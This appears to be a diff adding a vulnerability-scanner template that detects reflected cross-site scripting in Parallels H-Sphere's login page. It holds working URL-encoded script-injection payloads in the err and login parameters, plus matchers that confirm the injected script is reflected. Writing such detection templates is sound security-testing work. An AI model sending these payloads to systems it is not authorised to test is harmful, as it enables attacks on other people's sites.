@@ -1,0 +1,32 @@
+id: parallels-hsphere-xss
+brief:
+    title: Parallels H-Sphere - Cross-Site Scripting
+    by: ritikchaddha
+    level: high
+    about: Parallels H-Sphere contains multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data. An attacker may leverage these issues to execute arbitrary sc...
+    label:
+        - hsphere
+        - xss
+        - edb
+        - parallels
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/webshell4/login.php?err=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+        - '{{BaseURL}}/webshell4/login.php?login=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+      signs:
+        - "on": word
+          has:
+            - value="\"><script>alert(document.domain)</script>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
